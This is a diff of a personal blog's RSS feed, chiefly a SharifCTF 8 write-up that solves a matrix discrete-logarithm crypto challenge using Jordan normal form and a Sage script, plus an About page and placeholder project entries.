+&lt;p&gt;&lt;a href=&#34;https://discourse.gohugo.io&#34; target=&#34;_blank&#34;&gt;Ask&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://sourcethemes.com/academic/docs/&#34; target=&#34;_blank&#34;&gt;Documentation&lt;/a&gt;&lt;/p&gt;
+</description>
     </item>
     
     <item>
       <title>SharifCTF8_ElGamat</title>
       <link>https://philomath213.github.io/post/sharifctf8_elgamat/</link>
       <pubDate>Wed, 26 Sep 2018 22:19:28 +0100</pubDate>
-      <author>bilalphilomath@gmail.com (philomath213)</author>
+      
       <guid>https://philomath213.github.io/post/sharifctf8_elgamat/</guid>
-      <description>Sharif CTF 8 - ElGamat WriteUp Challenge details    Event Challenge Category Points     Sharif CTF 8 ElGamat Crypto 200    Description  ElGamal over Matrices: algebra-focused crypto challenge
-you can find full description in ElGamat.pdf
- Attachments  Matrices.txt
- Solution This problem appears to be similar to the discrete logarithm problem (see Discrete logarithm), but instead of the generator g we a have a matrix \(G\), So we need to find \(x\) such that \(G^x = H\) (both \(G\) and \(H\) are \(5\times5\) Matrices).</description>
+      <description>
+
+&lt;h1 id=&#34;sharif-ctf-8-elgamat-writeup&#34;&gt;Sharif CTF 8 - ElGamat WriteUp&lt;/h1&gt;
+
+&lt;h2 id=&#34;challenge-details&#34;&gt;Challenge details&lt;/h2&gt;
+
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th align=&#34;left&#34;&gt;Event&lt;/th&gt;
+&lt;th align=&#34;left&#34;&gt;Challenge&lt;/th&gt;
+&lt;th align=&#34;left&#34;&gt;Category&lt;/th&gt;
+&lt;th align=&#34;center&#34;&gt;Points&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td align=&#34;left&#34;&gt;Sharif CTF 8&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;ElGamat&lt;/td&gt;
+&lt;td align=&#34;left&#34;&gt;Crypto&lt;/td&gt;
+&lt;td align=&#34;center&#34;&gt;200&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h3 id=&#34;description&#34;&gt;Description&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;ElGamal over Matrices: algebra-focused crypto challenge&lt;/p&gt;
+
+&lt;p&gt;you can find full description in &lt;a href=&#34;https://philomath213.github.io/post/sharifctf8_elgamat/ElGamat.pdf&#34;&gt;ElGamat.pdf&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;attachments&#34;&gt;Attachments&lt;/h3&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://philomath213.github.io/post/sharifctf8_elgamat/Matrices.txt&#34;&gt;Matrices.txt&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&#34;solution&#34;&gt;Solution&lt;/h2&gt;
+
+&lt;p&gt;This problem appears to be similar to the discrete logarithm problem (see &lt;a href=&#34;https://en.wikipedia.org/wiki/Discrete_logarithm&#34; target=&#34;_blank&#34;&gt;Discrete logarithm&lt;/a&gt;), but instead of the generator g we a have a matrix \(G\), So we need to find \(x\) such that \(G^x = H\) (both \(G\) and \(H\) are \(5\times5\) Matrices).&lt;/p&gt;
+
+&lt;p&gt;Matrices =&amp;gt; Linear Algebra: this challenge requires some fundamentals in linear algebra.&lt;/p&gt;
+
+&lt;p&gt;At the beginning I tried to diagonalize the matrix \(G\) and \(H\) in order to transform the problem to a discrete logarithm problem, but it will stay hard to solve since \(p-1\) is not a product of small primes which in this case Pohlig–Hellman algorithm is not an efficient method for computing the discrete logarithms.&lt;/p&gt;
+
+&lt;p&gt;After doing some googling I figure out that in order to make this problem easy to solve we need to put both Matrices \(G\) and \(H\) in Jordan normal form (see &lt;a href=&#34;https://en.wikipedia.org/wiki/Jordan_normal_form&#34; target=&#34;_blank&#34;&gt;Jordan normal form&lt;/a&gt;)&lt;/p&gt;
+
+&lt;p&gt;A Jordan matrix has each non-zero off-diagonal entry equal to \(1\), immediately above the main diagonal.&lt;/p&gt;
+
+&lt;p&gt;for A a Jordan block as \(2\times2\) matrix, if we have a repeated eigenvalues:&lt;/p&gt;
+
+&lt;p&gt;$$
+A = \begin{pmatrix} \lambda &amp;amp; 1 \\ 0 &amp;amp; \lambda \end{pmatrix}
+$$
+for \(B = A^x\):
+$$
+B = \begin{pmatrix} \lambda^x &amp;amp; x\lambda^{x-1} \\ 0 &amp;amp; \lambda^x \end{pmatrix}
+$$&lt;/p&gt;
+
+&lt;p&gt;$$x = {-b \pm \sqrt{b^2-4ac} \over 2a}.$$&lt;/p&gt;
+
+&lt;p&gt;therefore in this case:
+$$
+B&lt;em&gt;{12} = xB&lt;/em&gt;{11}A&lt;em&gt;{11}^{-1} \iff x = A&lt;/em&gt;{11}B&lt;em&gt;{12}B&lt;/em&gt;{11}^{-1}
+$$&lt;/p&gt;
+
+&lt;p&gt;Now we need to apply this solution to ElGamat problem&lt;/p&gt;
+
+&lt;p&gt;In our case \(G[3][3]\) to \(G[4][4]\) is a Jordan block with repeated eigenvalues, and all arithmetic operations are in Quotient Ring \(Z/Z_p\)&lt;/p&gt;
+
+&lt;p&gt;this is my code in sage (&lt;a href=&#34;ElGamat.sage&#34; target=&#34;_blank&#34;&gt;ElGamat.sage&lt;/a&gt;):&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import hashlib
+
+p = 1461501637330902918203684832716283019655932542983
+
+G = [
+     [1287397632974625907369332145667695136576732725719,  999149001044306271168727399637009399486427921379,   1046504160269652701583906344218556291030141088947,  724446625683754938181565321149725788430461092168,    1071845980147173642753960259602135592110139561915],
+     [947603660931904341080240982051313712707367037453,   312289846563741934103580532543082761760226637905,   494739786803547247505263837170488583876166831850,   680540462980071181450018491798299105995449257198,    2602258415762368797405060707505977243346704576],
+     [996213673531855992829525358578006610606634622631,   1025711294257038288640877971869685565227647136954,  1432432135773706484846126533752827108541355741973,  1238541870126055576875033883691918425137600727481,   1130938956963588695293783764965618873887596017827],
+     [1320933266015680090206505704792362493057963931979,  1151746112645644166669332171392580649376526147475,  117512451110908867093773368598681106589771485221,   78071463743800894350883457304401524272336187149,     350437511649326676405126284689545814008237687775],
+     [438339253001275654203062260777687750937184662400,   372483950165136927369598298270629892810999203086,   859008773869616460027135965589262417694174453098,   1174526536643808668299968641952541506024584582818,   13201859260259503932772826643483081858286638179]
+    ]
+
+H = [
+     [903022231855038558383593109888227525558007552960,   565977275270298825053282757799743346899236483368,   989303675765663596792169321947495382568831693037,   601579288654704389384765634776493921679315260303,    913791750749394879333717884106841876340654737006],
+     [1159121456278955861257379214176694847802842944213,  55304385436577133507085707981392660143782780650,    559867756424853909301288957105188829240808301823,   1230859641388132364539374469026906952870988170695,   1423995124592695628047882256427827379994877406997],
+     [1125565199147204322161069021173152827232960621114,  1373772036013472137002755957284397215018630262515,  640623873603434273377865546046279663852895430999,   1056809237992218798189986002766547616222871640976,   1426649441470162608512662468308504390861950649943],
+     [303729376872199895471546635639837180361513146712,   1163767872227950278851006729914569662442255257700,  1320342731346163804219021270875175061467772367004,  433001013681018647747911760920686992297849343282,    1149024280460224794070159244078925721991430685838],
+     [23661702916810298505759145354543089608241235601,    1048655828654821525617176122368805879408325508567,  587846047820504813842423941849757078103027466928,   1338365929525105225695097114139069216753339875455,   1425543850003062038868121400064269552725872690214]
+    ]
+
+R = IntegerModRing(p)
+M = MatrixSpace(R, 5, 5)
+g = M(G)
+h = M(H)
+
+g, p_mat = g.jordan_form(transformation=True)
+
+print &#39;[+] jordan normal for G:&#39;
+for i in g:
+    print i
+
+h = p_mat.inverse()*h*p_mat
+print &#39;[+] jordan normal for H:&#39;
+for i in h:
+    print i
+
+a11 = g[3][3]
+b11 = h[3][3]
+b12 = h[3][4]
+
+x = a11*b12/b11
+assert b12 == x*a11^(x-1)
+
+print &#39;[+] solution:&#39;, x
+
+def flag_gen(alpha):
+	return &#39;SharifCTF{%s}&#39; % hashlib.md5(str(alpha).encode()).hexdigest()
+
+print &#39;[+] FLAG:&#39;, flag_gen(x)
+&lt;/code&gt;&lt;/pre&gt;
+</description>
     </item>
     
     <item>
       <title>About</title>
       <link>https://philomath213.github.io/page/about/</link>
       <pubDate>Wed, 26 Sep 2018 21:11:21 +0100</pubDate>
-      <author>bilalphilomath@gmail.com (philomath213)</author>
+      
       <guid>https://philomath213.github.io/page/about/</guid>
-      <description>philomath213: My name is Bilal Retiat, studing computer science at ESI-SBA, solving problems at HackerRank, doing challenges at Root-me.
-I skip school to participate in CTFs.
-Interests: Learning and Reading, CTF, Coding, Reverse Engineering, PWN, Crypto &amp;hellip;
-You can check out my projects and writings in this blog.
-You can also find me on social networks and github (the links are in the button of the page)</description>
+      <description>
+
+&lt;h4 id=&#34;philomath213&#34;&gt;philomath213:&lt;/h4&gt;
+
+&lt;p&gt;My name is Bilal Retiat, studing computer science at ESI-SBA, solving problems at HackerRank, doing challenges at Root-me.&lt;/p&gt;
+
+&lt;p&gt;I skip school to participate in CTFs.&lt;/p&gt;
+
+&lt;p&gt;Interests: Learning and Reading, CTF, Coding, Reverse Engineering, PWN, Crypto &amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;You can check out my projects and writings in this blog.&lt;/p&gt;
+
+&lt;p&gt;You can also find me on social networks and github (the links are in the button of the page)&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>External Project</title>
+      <link>https://philomath213.github.io/project/external-project/</link>
+      <pubDate>Wed, 27 Apr 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://philomath213.github.io/project/external-project/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Internal Project</title>
+      <link>https://philomath213.github.io/project/internal-project/</link>
+      <pubDate>Wed, 27 Apr 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://philomath213.github.io/project/internal-project/</guid>
+      <description>&lt;p&gt;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis posuere tellus ac convallis placerat. Proin tincidunt magna sed ex sollicitudin condimentum. Sed ac faucibus dolor, scelerisque sollicitudin nisi. Cras purus urna, suscipit quis sapien eu, pulvinar tempor diam. Quisque risus orci, mollis id ante sit amet, gravida egestas nisl. Sed ac tempus magna. Proin in dui enim. Donec condimentum, sem id dapibus fringilla, tellus enim condimentum arcu, nec volutpat est felis vel metus. Vestibulum sit amet erat at nulla eleifend gravida.&lt;/p&gt;
+
+&lt;p&gt;Nullam vel molestie justo. Curabitur vitae efficitur leo. In hac habitasse platea dictumst. Sed pulvinar mauris dui, eget varius purus congue ac. Nulla euismod, lorem vel elementum dapibus, nunc justo porta mi, sed tempus est est vel tellus. Nam et enim eleifend, laoreet sem sit amet, elementum sem. Morbi ut leo congue, maximus velit ut, finibus arcu. In et libero cursus, rutrum risus non, molestie leo. Nullam congue quam et volutpat malesuada. Sed risus tortor, pulvinar et dictum nec, sodales non mi. Phasellus lacinia commodo laoreet. Nam mollis, erat in feugiat consectetur, purus eros egestas tellus, in auctor urna odio at nibh. Mauris imperdiet nisi ac magna convallis, at rhoncus ligula cursus.&lt;/p&gt;
+
+&lt;p&gt;Cras aliquam rhoncus ipsum, in hendrerit nunc mattis vitae. Duis vitae efficitur metus, ac tempus leo. Cras nec fringilla lacus. Quisque sit amet risus at ipsum pharetra commodo. Sed aliquam mauris at consequat eleifend. Praesent porta, augue sed viverra bibendum, neque ante euismod ante, in vehicula justo lorem ac eros. Suspendisse augue libero, venenatis eget tincidunt ut, malesuada at lorem. Donec vitae bibendum arcu. Aenean maximus nulla non pretium iaculis. Quisque imperdiet, nulla in pulvinar aliquet, velit quam ultrices quam, sit amet fringilla leo sem vel nunc. Mauris in lacinia lacus.&lt;/p&gt;
+
+&lt;p&gt;Suspendisse a tincidunt lacus. Curabitur at urna sagittis, dictum ante sit amet, euismod magna. Sed rutrum massa id tortor commodo, vitae elementum turpis tempus. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean purus turpis, venenatis a ullamcorper nec, tincidunt et massa. Integer posuere quam rutrum arcu vehicula imperdiet. Mauris ullamcorper quam vitae purus congue, quis euismod magna eleifend. Vestibulum semper vel augue eget tincidunt. Fusce eget justo sodales, dapibus odio eu, ultrices lorem. Duis condimentum lorem id eros commodo, in facilisis mauris scelerisque. Morbi sed auctor leo. Nullam volutpat a lacus quis pharetra. Nulla congue rutrum magna a ornare.&lt;/p&gt;
+
+&lt;p&gt;Aliquam in turpis accumsan, malesuada nibh ut, hendrerit justo. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Quisque sed erat nec justo posuere suscipit. Donec ut efficitur arcu, in malesuada neque. Nunc dignissim nisl massa, id vulputate nunc pretium nec. Quisque eget urna in risus suscipit ultricies. Pellentesque odio odio, tincidunt in eleifend sed, posuere a diam. Nam gravida nisl convallis semper elementum. Morbi vitae felis faucibus, vulputate orci placerat, aliquet nisi. Aliquam erat volutpat. Maecenas sagittis pulvinar purus, sed porta quam laoreet at.&lt;/p&gt;
+</description>
     </item>
     
   </channel>
